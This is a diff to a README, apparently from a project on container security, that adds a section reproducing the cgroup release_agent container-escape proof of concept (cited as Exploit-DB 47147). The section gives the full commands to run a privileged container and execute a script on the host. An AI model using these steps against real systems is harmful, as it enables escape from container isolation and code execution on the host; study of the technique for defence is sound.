@@ -155,4 +155,28 @@ Also, add create lib and lib64 directories to bash to contain libraries for x86 
 
 10. To see the contents of the new root directory, use ls. Everything in the original directory can be seen here. But when we try to check the present working directory it shows /, implying that it considers the new root directory as the actual one, instead of the original, and there is no way of navigating back to it, leading to a compromise on authentication and hence, a vulnerability. 
 
+
+
+
+### Exploiting Chmod (Change mode) EDB-ID:47147
+
+Reference: https://www.exploit-db.com/exploits/47147
+
+# On the host
+	docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
+
+# In the container
+	mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+
+	echo 1 > /tmp/cgrp/x/notify_on_release
+	host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+	echo "$host_path/cmd" > /tmp/cgrp/release_agent
+
+	echo '#!/bin/sh' > /cmd
+	echo "ps aux > $host_path/output" >> /cmd
+	chmod a+x /cmd
+
+	sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"	
+	
+	
 ![alt text](https://github.com/PRISHIta123/Securing_Open_Source_Components_on_Containers/blob/master/jail.JPG)
